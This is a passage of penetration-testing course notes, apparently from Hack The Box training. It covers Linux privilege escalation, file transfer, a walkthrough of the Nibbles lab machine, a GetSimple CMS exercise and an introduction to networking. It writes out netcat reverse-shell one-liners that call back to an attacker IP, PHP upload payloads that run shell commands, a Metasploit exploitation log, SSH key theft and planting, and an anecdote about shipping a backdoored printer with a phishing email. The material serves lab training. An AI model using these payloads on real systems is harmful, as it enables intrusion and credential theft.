If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

#### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us

We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user.

#### SSH Keys

Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
```bash
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
root@remotehost#
```
Note that we used the command `chmod 600 id_rsa` on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users `.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
```bash
ssh-keygen -f key
```
```txt
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

This will give us two files: key (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
```bash
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:
```bash
ssh root@10.10.10.10 -i key
root@remotehost#
```

#### Transferring Files

There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host.

Another method to transfer files would be using SCP (Secure Copy Protocol), granted we have obtained ssh user credentials on the remote host. We can do so as follows:
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
```txt
user@remotehost's password: *********
```

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to `base64` encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
```bash
base64 shell -w 0
f0VMRgIBAQAAAAAAAAA... <SNIP> ...gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
```bash
user@remotehost$ echo "f0VMRgIBAQAAAAAAAAA... <SNIP> ...gAU0iJ51JXSInmDwU" | base64 -d > shell
```

To validate the format of a file, we can run the `file` command on it:
```bash
file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
```bash
md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```

Now, we can go to the remote server and run the same command on the file we transferred:
```bash
user@remotehost$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```

As we can see, both files have the same md5 hash, meaning the file was transferred correctly.

### Resources recommended by HTB

```txt
OWASP Juice Shop 	Is a modern vulnerable web application written in Node.js, Express, and Angular which
                    showcases the entire OWASP Top Ten along with many other real-world application
                    security flaws.
Metasploitable 2 	Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration,
                    automated, and manual exploitation.
Metasploitable 3 	Is a template for building a vulnerable Windows VM configured with a wide range of
                    vulnerabilities.
DVWA 	            This is a vulnerable PHP/MySQL web application showcasing many common web application
                    vulnerabilities with varying degrees of difficulty.
```

It is worth learning how to set these up in your lab environment to gain extra practice setting up VMs and working with common configurations such as setting up a web server.

One great blog worth checking out is [0xdf](https://0xdf.gitlab.io/) hacks stuff.

Aside from blogs related to retired HTB boxes, it is also worth seeking out blog write-ups on recent exploits/attacks, Active Directory exploitation techniques, CTF event write-ups, and bug bounty report write-ups. These can all contain a wealth of information that may help connect some dots in our learning or even teach us something new that can come in handy on an assessment.

Two great tutorial websites are [Under The Wire](https://underthewire.tech/wargames) and [Over The Wire](https://overthewire.org/wargames/). These websites are set up to help train users on using both Windows PowerShell and the Linux command line, respectively, through various scenarios in a "war games" format.

The [Dante Pro Lab](https://app.hackthebox.com/prolabs/overview/dante) is the most beginner-friendly lab offered to date. This lab is geared towards players with some experience performing network and web application attacks and an understanding of networking concepts and the basics of penetration methodologies such as scanning/enumeration, lateral movement, privilege escalation, post-exploitation, etc.

### Nibbles

We can use `whatweb` to try to identify the web application in use.
```bash
whatweb 10.129.42.190
http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ],
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
```

A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this.
```bash
gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```
```bash
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
```
```bash
curl http://10.129.42.190/nibbleblog/README
```
```bash
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
<SNIP>
```

The HTTP code `301` means a permanent redirect. But that does not mean fail! We can check each of these.

Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the XML output using `xmllint`.
```bash
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
```

Up to this point, have the following pieces of the puzzle:

* A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability.

* An admin portal at `nibbleblog/admin.php`.

* Directory listing which confirmed that admin is a valid username.

* Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table.

Taking another look through all of the exposed directories, we find a `config.xml` file.
```bash
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
```
Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password? `Yes`.

When performing password cracking offline with a tool such as `Hashcat` or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).

Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. Looking around a bit, we see the following page:
```txt
Plugins 	Allows us to configure, install, or uninstall plugins. The "My image" plugin allows us to upload
            an image file. Could this be abused to upload PHP code potentially?
```

Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.
```php
<?php system('id'); ?>
<?php system('sudo bash'); ?>
```

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a plugins directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
```bash
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Let us use the following Bash reverse shell one-liner and add it to our PHP script.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a `netcat` listener in our terminal:

`cURL` the image page again or browse to it in Firefox at `http://nibbleblog/content/private/plugins/my_image/image.php` to execute the reverse shell.
```bash
nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: cant access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Try the various techniques for upgrading to a full TTY and pick one that works best for you.

Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.

Let's pull in `LinEnum.sh` to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command `sudo python3 -m http.server 8080`.

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' |
tee -a monitor.sh
```
It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.

root flag: de5e5d6619862a8aa5b9b212314e0cdd

Another way to get the reverse shell is by using `Metasploit` Nibbleblog exploit.

### Tips

Remember that enumeration is an iterative process. After performing our `nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with Nibbles:

* Enumeration/Scanning with `nmap` - perform a quick scan for open ports followed by a full port scan.

* Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `gobuster`.

* If you identify the website URL, you can add it to your `/etc/hosts` file with the IP you get in the question below to load it normally, though this is unnecessary.

* After identifying the technologies in use, use a tool such as `searchsploit` to find public exploits or search on Google for manual exploitation techniques.

* After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY.

* Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials.

* Organize this data offline to determine the various ways to escalate privileges to root on this target.

There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.

### Knowledge Check

Target: `10.129.42.249`.

Go to `http://10.129.42.249/`, and we see we have to add `10.129.42.249   gettingstarted.htb` to `/etc/hosts`.

After running `nmap` (ports 22 and 80 are open) and `gobuster`, we discover many accessible directories. The command `searchsploit getsimple` returns several vulnerabilities. Browsing through the accessible directories, we get
```html
http://gettingstarted.htb/data/cache/2a4c6447379fba09620ba05582eb61af.txt
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
```

The version is `3.3.15` and there is a corresponding exploit [https://www.exploit-db.com/exploits/46880](https://www.exploit-db.com/exploits/46880) available for this version. We then use `metasploit` and get a reverse shell on the target.
```bash
msfconsole
msf6 > search GetSimple

Matching Modules
================

#  Name                                              Disclosure Date  Rank       Check  Description
-  ----                                              ---------------  ----       -----  -----------
0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    PHP File Upload Vuln.
1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    Unauthenticated RCE

msf6 > use 1
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options

Module options (exploit/multi/http/getsimplecms_unauth_code_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port
   RHOSTS                      yes       The target host(s)
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the cms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   GetSimpleCMS 3.3.15 and before

msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set rhosts 10.129.42.249
rhosts => 10.129.42.249
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set lhost 10.10.15.201
lhost => 10.10.15.201
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show payloads
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set payload generic/shell_reverse_tcp
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > check
[+] 10.129.42.249:80 - The target is vulnerable.
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.15.201:4444
[*] Command shell session 1 opened (10.10.15.201:4444 -> 10.129.42.249:45940) at 2024-04-02 11:21:23 -0300

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gettingstarted:/var/www/html/theme$
```

Now we go to `/home/mrb3n` to get the user flag `user.txt`. Running `sudo -l`, we get
```bash
www-data@gettingstarted:/home/mrb3n$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

The `php` interpreter can be runned as root. Therefore:
```bash
www-data@gettingstarted:/home/mrb3n$ cd /tmp
www-data@gettingstarted:/tmp$ echo "<?php system('sudo bash'); ?>" > privesc.php
www-data@gettingstarted:/tmp$ sudo php privesc.php
root@gettingstarted:/tmp# whoami
root
root@gettingstarted:/tmp# cat /root/root.txt
```

### Recommended Machines/Challenges

* Retired Machines: Academy (E), Access (E), Active (E), Admirer (E), Antique (E), Arctic (E), Armageddon (E), Backdoor (E), Bank (E), Bastion (E), Beep (E), Blocky (E), Blue (E), Blunder (E), Bounty (E), BountyHunter (E), Buff (E), Busqueda (E), Cap (E), Chatterbox (M), Curling (E), Delivery (E), Devel (E), Doctor (E), Driver (E), Explore (E), Forest (E), FriendZone (E), Frolic (E), GoodGames (E), Grandpa (E), Granny (E), Haystack (E), Heist (E), Help (E), Horizontall (E), Inject (E), Irked (E), Jerry (E), Knife (E), Laboratory (E), LaCasaDePapel (E), Lame (E), Late (E), Legacy (E), Love (E), Luanne (E), MetaTwo (E), Mirai (E), MonitorsTwo (E), Nest (E), Netmon (E), Networked (E), Nibbles (E), NodeBlog (E), Nunchucks (E), Omni (E), OpenAdmin (E), OpenSource (E), Optimum (E), Pandora (E), Paper (E), PC (E), Photobomb (E), Pilgrimage (E), Poison (M), Postman (E), Precious (E), Previse (E), RedPanda (E), Remote (E), Return (E), RouterSpace (E), Safe (E), Sauna (E), ScriptKiddie (E), Secret (E), Sense (E), ServMon (E), Shocker (E), Shoppy (E), Soccer (E), Spectra (E), Squashed (E), SteamCloud (E), Sunday (E), Support (E), SwagShop (E), Tabby (E), Teacher (E), Timelapse (E), Toolbox (E), Topology (E), Traceback (E).

* Retired Challenges: Find The Easy Pass (E), Weak RSA (E), You know 0xDiablos (E), Emdee five for life (E), Under Construction (M).

* Tracks: Beginner Track (E).



## 4. Introduction to Networking

### Introduction

Printers should be on their own network. This may sound weird, but it is next to impossible to secure a printer. Due to how Windows works, if a printer tells a computer authentication is required during a print job, that computer will attempt an NTLMv2 authentication, which can lead to passwords being stolen. Additionally, these devices are great for persistence and, in general, have tons of sensitive information sent to them.

#### Fun Story

During COVID, I was tasked to perform a Physical Penetration Test across state lines, and my state was under a stay at home order. The company I was testing had minimal staff in the office. I decided to purchase an expensive printer and exploited it to put a reverse shell in it, so when it connected to the network, it would send me a shell (remote access). Then I shipped the printer to the company and sent a phishing email thanking the staff for coming in and explaining that the printer should allow them to print or scan things more quickly if they want to bring some stuff home to WFH for a few days. The printer was hooked up almost instantly, and their domain administrator's computer was kind enough to send the printer his credentials!

If the client had designed a secure network, this attack probably would not have been possible for many reasons:

* Printer should not have been able to talk to the internet.
* Workstation should not have been able to communicate to the printer over port 445.
* Printer should not be able to initiate connections to workstations. In some cases, printer/scanner combinations should be able to communicate to a mail server to email scanned documents.

### Network Types

Common Terminology
```txt
Network Type 	                    Definition
Wide Area Network (WAN) 	        Internet
Local Area Network (LAN) 	        Internal Networks (Ex: Home or Office)
Wireless Local Area Network (WLAN) 	Internal Networks accessible over Wi-Fi
Virtual Private Network (VPN) 	    Connects multiple network sites to one LAN
```

### Proxies

A proxy is when a device or service sits in the middle of a connection and acts as a mediator. The mediator is the critical piece of information because it means the device in the middle must be able to inspect the contents of the traffic. Without the ability to be a mediator, the device is technically a gateway, not a proxy.

If you have trouble remembering this, proxies will almost always operate at Layer 7 of the OSI Model.

A reverse proxy, is the reverse of a Forward Proxy. Instead of being designed to filter outgoing requests, it filters incoming ones.

Many organizations use CloudFlare as they have a robust network that can withstand most DDOS Attacks. By using Cloudflare, organizations have a way to filter the amount (and type) of traffic that gets sent to their webservers.

Relevant for the HTB machine `Headless`:

Penetration Testers will configure reverse proxies on infected endpoints. The infected endpoint will listen on a port and send any client that connects to the port back to the attacker through the infected endpoint. This is useful to bypass firewalls or evade logging. Organizations may have IDS (Intrusion Detection Systems), watching external web requests. If the attacker gains access to the organization over SSH, a reverse proxy can send web requests through the SSH Tunnel and evade the IDS.

### OSI and TCP/IP Reference Models

![](fig/osi_tcpip.png)
